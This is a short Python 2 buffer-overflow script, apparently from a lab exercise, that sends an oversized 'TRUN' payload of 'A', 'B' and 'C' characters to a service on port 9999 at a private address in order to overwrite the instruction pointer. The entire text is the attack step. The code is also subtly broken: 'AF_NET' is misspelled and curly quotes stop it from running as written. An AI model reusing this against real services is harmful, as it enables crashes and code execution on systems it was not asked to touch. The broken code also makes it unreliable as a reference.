import socket

s=socket.socket(socket.AF_NET, socket.SOCK_STREAM)

# C = 5000 - 2005 - 4 
buffer = "A"*2005 + "B"*4 + "C"*3041

try:
   print “sending attack buffer”
   s.connect((’10.0.0.64’, 9999))
   data=s.recv(1024)
   s.send(‘TRUN . ‘ + buffer + ‘\r\n’)
   data = s.recv(1024)
except:
   print ‘OMFG Error!’
